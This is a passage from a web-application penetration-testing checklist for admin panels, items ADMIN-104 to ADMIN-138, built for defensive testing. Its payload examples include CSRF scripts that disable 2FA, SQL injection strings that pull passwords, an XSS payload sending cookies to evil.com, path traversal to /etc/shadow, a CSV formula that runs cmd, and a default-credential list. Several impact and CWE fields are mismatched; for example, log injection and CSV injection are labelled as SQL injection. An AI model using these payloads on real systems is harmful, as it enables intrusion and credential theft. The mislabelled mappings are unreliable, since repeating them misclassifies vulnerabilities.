**Where to Test / Injection Point:** Feature Toggles

**Test Steps:** 1. Access feature toggle listing. 2. Check if disabled features reveal upcoming features or internal plans. 3. Verify if feature descriptions expose sensitive information. 4. Check for feature flag names exposing business logic.

**Expected Result:** Feature toggle listings must not reveal sensitive business plans or upcoming features to unauthorized users.

**Payload Example:**

```
GET /api/admin/features check for upcoming_acquisition_integration;secret_partner_feature;internal_project_x
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADMIN-105 — CSRF on Feature Toggle Change
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Feature Toggles

**Test Steps:** 1. Craft a malicious page that disables critical security features via toggles. 2. Lure admin to visit. 3. Check if feature toggle changes require CSRF token and confirmation.

**Expected Result:** Application must validate CSRF tokens on all feature toggle operations and require confirmation for security-critical toggle changes.

**Payload Example:**

```
<script>fetch('/api/admin/features/2fa-enforcement',{method:'PUT',credentials:'include',headers:{'Content-Type':'application/json'},body:'{"enabled":false}'})</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## ADMIN-106 — Feature Toggle SQL Injection
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Feature Toggles

**Test Steps:** 1. Search or filter feature toggles. 2. Inject SQL payloads in feature name or status filter. 3. Observe for SQL errors or data leakage.

**Expected Result:** Application must use parameterized queries for all feature toggle database operations.

**Payload Example:**

```
GET /api/admin/features?name=' OR 1=1--;GET /api/admin/features?status=enabled' UNION SELECT password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADMIN-107 — Feature Toggle Environment Mismatch
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Feature Toggles

**Test Steps:** 1. Check if development or staging feature toggles are active in production. 2. Verify environment-specific toggle configurations. 3. Test for debug features enabled in production.

**Expected Result:** Feature toggles must be properly configured per environment with no development or debugging features active in production.

**Payload Example:**

```
Check for debug_mode=true;verbose_logging=true;test_payment_gateway=true;skip_authentication=true in production feature flags
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;Manual Review

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## ADMIN-108 — Maintenance Mode Authentication Bypass
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Maintenance Mode

**Test Steps:** 1. Enable maintenance mode. 2. Check if all endpoints are properly restricted. 3. Test for API endpoints still accessible during maintenance. 4. Check if admin access is properly maintained. 5. Test for bypass via headers.

**Expected Result:** Application must consistently restrict all user-facing functionality during maintenance mode while maintaining secure admin access for management.

**Payload Example:**

```
Access /api/users;/api/data;/api/sensitive during maintenance mode;test with X-Maintenance-Bypass: true header
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ADMIN-109 — Unauthorized Maintenance Mode Toggle
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Maintenance Mode

**Test Steps:** 1. As a non-admin attempt to enable or disable maintenance mode. 2. Access maintenance mode API endpoint. 3. Check if maintenance mode can be weaponized for DoS. 4. Verify role restrictions.

**Expected Result:** Application must restrict maintenance mode control to super-admin roles and require re-authentication for maintenance mode changes.

**Payload Example:**

```
PUT /api/admin/maintenance with enabled=true using non-admin token;POST /api/admin/maintenance/toggle with regular credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-110 — CSRF on Maintenance Mode Activation
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Maintenance Mode

**Test Steps:** 1. Craft a malicious page that enables maintenance mode. 2. Lure super-admin to visit. 3. Check if maintenance mode activates causing service disruption for all users.

**Expected Result:** Application must validate CSRF tokens and require re-authentication for maintenance mode activation.

**Payload Example:**

```
<script>fetch('/api/admin/maintenance',{method:'PUT',credentials:'include',headers:{'Content-Type':'application/json'},body:'{"enabled":true,message:"Site is down"}'})</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## ADMIN-111 — Maintenance Mode Bypass via Cached Content
**Test Category:** Caching (WSTG-ATHN-06) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Maintenance Mode

**Test Steps:** 1. Access application pages and cache them. 2. Enable maintenance mode. 3. Check if cached content is still served. 4. Test CDN caching during maintenance. 5. Verify cache purging.

**Expected Result:** Application must purge all caches when maintenance mode is activated and serve maintenance page from origin without caching.

**Payload Example:**

```
Access pages before maintenance;enable maintenance;check if CDN serves cached content;verify cache headers
```

**Impact:** Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure.

**Tools:** Burp Suite;Browser;CDN Management

**References:** CWE-524; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception

---

## ADMIN-112 — Maintenance Mode Information Disclosure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Maintenance Mode

**Test Steps:** 1. Access the maintenance page. 2. Check for information disclosure about system status or scheduled maintenance details. 3. Inspect maintenance page source for internal information.

**Expected Result:** Maintenance mode pages must not reveal system internals and expected downtime details or infrastructure information to end users.

**Payload Example:**

```
Check maintenance page for server_version;expected_downtime;deployment_details;infrastructure_info;debug_data
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADMIN-113 — Maintenance Mode XSS via Custom Message
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Maintenance Mode

**Test Steps:** 1. Set a custom maintenance mode message. 2. Include XSS payload in the message. 3. View the maintenance page. 4. Check if XSS executes for all users seeing the maintenance page.

**Expected Result:** Application must sanitize the maintenance mode message and encode output when rendering it on the maintenance page.

**Payload Example:**

```
maintenance_message=<script>alert(document.cookie)</script>;custom_html=<img src=x onerror=fetch('https://evil.com/'+document.cookie)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ADMIN-114 — Selective Maintenance Mode Bypass for API
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Maintenance Mode

**Test Steps:** 1. Enable maintenance mode. 2. Check if API endpoints are accessible while web interface is in maintenance. 3. Test for inconsistent maintenance enforcement across channels. 4. Verify mobile app behavior.

**Expected Result:** Application must enforce maintenance mode consistently across all access channels including web and API and mobile and WebSocket.

**Payload Example:**

```
Access /api/v1/data during maintenance;check WebSocket connectivity;test mobile API endpoints;verify consistency
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADMIN-115 — Unauthorized Error Log Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Error Logs / Debugging

**Test Steps:** 1. Access error log viewing endpoints as non-admin. 2. Check common error log URLs. 3. Test for directory listing of log directories. 4. Access logging administration endpoints.

**Expected Result:** Application must restrict error log access to authorized admin roles and store logs in non-web-accessible locations.

**Payload Example:**

```
GET /api/admin/error-logs;GET /logs/;GET /var/log/app/;GET /error-log;GET /debug/logs with non-admin credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;DirBuster

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-116 — Sensitive Data in Error Logs
**Test Category:** Information Disclosure (WSTG-ERRH-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Error Logs / Debugging

**Test Steps:** 1. Access error logs. 2. Search for passwords and API keys and session tokens and personal data. 3. Check if stack traces contain sensitive configuration. 4. Verify PII masking in logs.

**Expected Result:** Error logs must not contain plaintext passwords or tokens or API keys and must mask PII and sanitize stack traces.

**Payload Example:**

```
Search logs for password=;api_key=;session=;token=;credit_card=;ssn=;check stack traces for config details
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Manual Review;Grep;Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADMIN-117 — Error Log Injection
**Test Category:** Injection (WSTG-INPV-15) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Error Logs / Debugging

**Test Steps:** 1. Trigger application errors with crafted input containing log injection payloads. 2. Include CRLF characters to forge log entries. 3. Inject ANSI escape codes. 4. Test for log forging.

**Expected Result:** Application must sanitize all data written to error logs to prevent log injection and forging attacks.

**Payload Example:**

```
input=test%0d%0a[CRITICAL] System compromised%0d%0a;param=value%0aFake admin login success;inject ANSI escape sequences
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADMIN-118 — Debug Mode Enabled in Production
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Error Logs / Debugging

**Test Steps:** 1. Check if debug mode is enabled. 2. Trigger errors and check for verbose stack traces. 3. Check for debug toolbars and profilers. 4. Test for debug-only endpoints. 5. Check framework debug settings.

**Expected Result:** All debug features must be disabled in production with no verbose error messages or debug toolbars or profiler access available.

**Payload Example:**

```
Trigger 500 error and check for stack trace;access /debug;/_debug;/phpinfo;/elmah.axd;check Django DEBUG=True;Rails development mode
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;Nuclei;DirBuster

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## ADMIN-119 — Error Log Path Traversal
**Test Category:** Path Traversal (WSTG-INPV-10) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Error Logs / Debugging

**Test Steps:** 1. Access error log download endpoint. 2. Modify the file path parameter. 3. Attempt to read arbitrary files via the log viewer. 4. Test with encoded traversal sequences.

**Expected Result:** Application must validate log file paths and restrict access to authorized log directories only.

**Payload Example:**

```
GET /api/admin/logs/download?file=../../../etc/passwd;file=....//....//etc/shadow;logfile=%2e%2e%2f
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite;Postman

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## ADMIN-120 — Error Log XSS in Log Viewer
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Error Logs / Debugging

**Test Steps:** 1. Trigger application errors with XSS payloads in input that gets logged. 2. View error logs in the admin panel log viewer. 3. Check if stored XSS executes when admin reviews logs.

**Expected Result:** Application must encode all error log data when rendering in the admin log viewer to prevent stored XSS attacks on administrators.

**Payload Example:**

```
Trigger error with input=<script>alert(document.cookie)</script>;view in admin log viewer;check for XSS in stack trace display
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ADMIN-121 — Error Log SQL Injection in Search
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Error Logs / Debugging

**Test Steps:** 1. Search error logs by various criteria. 2. Inject SQL payloads in search parameters. 3. Test date range and error type and source filters. 4. Observe for SQL errors.

**Expected Result:** Application must use parameterized queries for all error log search and filtering operations.

**Payload Example:**

```
GET /api/admin/error-logs?search=' OR 1=1--;GET /api/admin/logs?level=error' UNION SELECT password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADMIN-122 — Error Log Denial of Service
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Error Logs / Debugging

**Test Steps:** 1. Generate massive volume of errors rapidly. 2. Check if log storage capacity is monitored. 3. Test if excessive logging affects application performance. 4. Verify log rotation and disk space management.

**Expected Result:** Error logging must handle high volumes without affecting application performance with proper rotation and disk space monitoring.

**Payload Example:**

```
Trigger 100000+ errors per minute by sending malformed requests;check for log-based DoS;verify disk space monitoring
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite Intruder;JMeter

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## ADMIN-123 — Debug Endpoint Remote Code Execution
**Test Category:** Injection (WSTG-INPV-12) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Error Logs / Debugging

**Test Steps:** 1. Check for debug endpoints that allow code evaluation. 2. Test for remote debugger access. 3. Check for exposed debugging ports. 4. Test for eval or execute endpoints.

**Expected Result:** Debug code execution endpoints must never be accessible in production environments and must be completely removed from production deployments.

**Payload Example:**

```
Access /debug/eval;/console;/debug/exec;check for exposed ports 5005(Java Debug);4444(Ruby Debug);connect to remote debugger
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Nmap;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADMIN-124 — Error Rate Monitoring Bypass
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Error Logs / Debugging

**Test Steps:** 1. Check if error rate monitoring triggers alerts. 2. Gradually increase error rate to avoid threshold detection. 3. Test if error patterns from attacks are detected. 4. Verify alerting mechanisms.

**Expected Result:** Application must implement intelligent error rate monitoring that detects gradual increases and attack patterns not just sudden spikes.

**Payload Example:**

```
Slowly increase error rate over hours to avoid sudden spike detection;test with distributed error generation
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Custom Scripts;Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## ADMIN-125 — Admin Account Default Credentials
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** User Management

**Test Steps:** 1. Attempt login with common default credentials for admin accounts. 2. Test admin and password and admin123 and root. 3. Check for documentation-specified defaults. 4. Test after fresh installation.

**Expected Result:** Application must not ship with default admin credentials and must require secure password setup during initial installation.

**Payload Example:**

```
Try admin:admin;admin:password;admin:admin123;root:root;administrator:administrator;sa:sa;test:test
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Hydra;Custom Credential Lists

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ADMIN-126 — User Import CSV Injection
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** User Management

**Test Steps:** 1. If user management supports bulk import via CSV inject formula payloads. 2. Import users with malicious data. 3. Export users and check if formulas execute. 4. Test with DDE payloads.

**Expected Result:** Application must sanitize imported user data and escape formula-triggering characters in all import and export operations.

**Payload Example:**

```
Import CSV: =cmd|'/C calc'!A0;username;+cmd|'/C calc'!A0;-cmd|'/C calc'!A0;@SUM(1+1)*cmd
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Manual Testing

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADMIN-127 — Role Permission Caching Exploit
**Test Category:** Caching (WSTG-ATHN-06) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Role Management

**Test Steps:** 1. Assign a high-privilege role temporarily. 2. Perform privileged actions. 3. Revoke the role. 4. Check if cached permissions still allow privileged access. 5. Verify real-time permission enforcement.

**Expected Result:** Application must enforce permissions in real-time without relying on cached role data and invalidate permission caches on role changes.

**Payload Example:**

```
Get admin role;perform privileged action;revoke admin role;immediately retry privileged action;check if cache allows it
```

**Impact:** Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure.

**Tools:** Burp Suite;Postman

**References:** CWE-524; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception

---

## ADMIN-128 — System Settings Environment Variable Exposure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** System Settings

**Test Steps:** 1. Access system settings or configuration endpoints. 2. Check if environment variables are exposed. 3. Look for database URLs and API keys and secret keys in configuration. 4. Test for .env file exposure.

**Expected Result:** Application must not expose environment variables through any API endpoint and must protect .env files from web access.

**Payload Example:**

```
GET /api/admin/settings/env;GET /.env;GET /api/admin/config;check for DATABASE_URL;SECRET_KEY;AWS_ACCESS_KEY in responses
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;DirBuster;Nuclei

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADMIN-129 — Audit Log CORS Misconfiguration
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Audit Logs

**Test Steps:** 1. Access audit log API from a different origin. 2. Check CORS headers on audit log endpoints. 3. Test for wildcard origin allowance. 4. Check for credentials with wildcard.

**Expected Result:** Audit log API endpoints must have restrictive CORS policies not allowing cross-origin access from unauthorized domains.

**Payload Example:**

```
Send Origin: https://evil.com to audit log API;check for Access-Control-Allow-Origin: *;verify credentials flag
```

**Impact:** CORS misconfiguration -&gt; credentialed cross-origin secret theft -&gt; account takeover.

**Tools:** Burp Suite;cURL

**References:** CWE-942; -&gt;[CORS checklist](#/checklist/cors); PortSwigger CORS; Christian Schneider

---

## ADMIN-130 — Health Check Endpoint Cache Poisoning
**Test Category:** Caching (WSTG-ATHN-06) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** System Health Monitoring

**Test Steps:** 1. Access health check endpoints with cache-manipulation headers. 2. Inject false health status into cache. 3. Check if subsequent requests receive poisoned cache. 4. Test for monitoring system confusion.

**Expected Result:** Health check responses must not be cached in shared caches and must always reflect real-time system status.

**Payload Example:**

```
Add X-Forwarded-Host: evil.com to /health;inject Cache-Control manipulation;check for cached false status
```

**Impact:** Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-524; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception

---

## ADMIN-131 — Backup Encryption Key Exposure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Backup / Restore

**Test Steps:** 1. Check where backup encryption keys are stored. 2. Verify keys are not stored alongside backups. 3. Check for hardcoded encryption keys. 4. Test key management separation.

**Expected Result:** Backup encryption keys must be stored separately from backups in a secure key management system and never hardcoded.

**Payload Example:**

```
Search for backup_encryption_key in source code;check if keys are stored in same location as backups;verify KMS usage
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** GitLeaks;Manual Review

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADMIN-132 — Data Migration Audit Trail Verification
**Test Category:** Logging (WSTG-CONF-09) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Data Migration

**Test Steps:** 1. Perform a data migration. 2. Verify complete audit trail of the migration. 3. Check if migration actions are attributed to the initiating admin. 4. Verify migration data change logging.

**Expected Result:** All data migration operations must generate comprehensive audit trail entries with the initiating admin and all data changes recorded.

**Payload Example:**

```
Perform migration and check audit log for migration_start;data_changed;records_affected;initiated_by;completion_status
```

**Impact:** Insufficient or injectable logging -&gt; forensic gaps / log injection / audit bypass.

**Tools:** Manual Review;Burp Suite

**References:** CWE-778; OWASP Logging &amp; Monitoring Failures (A09)

---

## ADMIN-133 — Bulk Operation Progress Disclosure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Bulk Operations

**Test Steps:** 1. Trigger a bulk operation. 2. Check if progress endpoint exposes processing details. 3. Monitor for information leakage about other tenants' data in progress. 4. Verify data isolation in progress tracking.

**Expected Result:** Bulk operation progress must only display information about the authorized user's operation without leaking other tenants' data.

**Payload Example:**

```
GET /api/admin/bulk/progress/JOB-1001 check for cross-tenant data in processing_details;affected_records information
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADMIN-134 — Export File Direct Access Without Auth
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Import / Export Tools

**Test Steps:** 1. Trigger a data export. 2. Capture the download URL. 3. Access the URL without authentication. 4. Test with expired session. 5. Check for publicly accessible export storage.

**Expected Result:** Export files must require valid authentication for access and use signed time-limited download URLs that expire after first use.

**Payload Example:**

```
Access /exports/data-export-2025.csv without authentication;test with expired token;check for S3 bucket public access
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Browser;AWS CLI

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ADMIN-135 — Email Template Version Control Bypass
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Email Templates

**Test Steps:** 1. If templates have version control modify a template and bypass approval workflow. 2. Publish changes without review. 3. Revert to malicious previous version.

**Expected Result:** Application must enforce template change approval workflows and maintain version control with proper review processes.

**Payload Example:**

```
PUT /api/admin/email-templates/TMPL-1001/publish without approval;POST /api/admin/email-templates/TMPL-1001/revert to malicious version
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADMIN-136 — Notification Template Channel Mismatch
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Notification Templates

**Test Steps:** 1. Modify a push notification template. 2. Include HTML or rich content intended for email in the push template. 3. Check if channel-inappropriate content causes issues. 4. Test for content injection across channels.

**Expected Result:** Application must validate notification template content is appropriate for the target channel and prevent cross-channel content injection.

**Payload Example:**

```
Set push_template with full HTML email content;set SMS template with 10000 character body;mix channel-specific formatting
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADMIN-137 — Localization File Upload Vulnerability
**Test Category:** File Upload (WSTG-INPV-12) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Localization Settings

**Test Steps:** 1. If localization supports file upload for translation files upload malicious files. 2. Upload PHP or JSP files as language files. 3. Test with XXE in XML translation files.

**Expected Result:** Application must validate localization file content and type preventing malicious file uploads and XXE in translation file processing.

**Payload Example:**

```
Upload shell.php as en.php language file;upload XML translation file with XXE payload;upload oversized language file
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite;Custom Files

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## ADMIN-138 — Branding Content-Security-Policy Override
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Branding / White-labeling

**Test Steps:** 1. If branding allows custom scripts or external resources check if CSP is weakened. 2. Test if custom branding code bypasses CSP. 3. Verify CSP remains effective after branding changes.

**Expected Result:** Custom branding must not weaken the application's Content-Security-Policy and any custom resources must be served from allowed origins.

**Payload Example:**

```
Check if branding changes add unsafe-inline or unsafe-eval to CSP;verify CSP is not disabled for branded pages
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;CSP Evaluator

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## ADMIN-139 — Feature Toggle API Exposure
